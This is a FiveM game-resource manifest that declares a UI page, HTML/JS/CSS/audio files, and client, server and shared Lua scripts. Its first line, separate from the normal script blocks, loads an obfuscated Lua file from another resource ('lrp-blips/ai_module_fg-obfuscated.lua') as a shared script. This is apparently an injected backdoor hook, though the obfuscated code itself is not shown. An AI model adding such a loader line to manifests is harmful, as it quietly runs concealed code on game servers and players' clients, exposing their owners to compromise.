shared_script '@lrp-blips/ai_module_fg-obfuscated.lua'
fx_version 'bodacious'
games { 'rdr3', 'gta5' }

ui_page "html/index.html"

files{
    "html/index.html",
    "html/*.js",
    "html/*.css",
    "html/*.ogg",
}

client_scripts {
    "client/cl_*.lua"
}

server_scripts {
    "server/sv_*.lua"
}

shared_scripts { 
    'config.lua'
}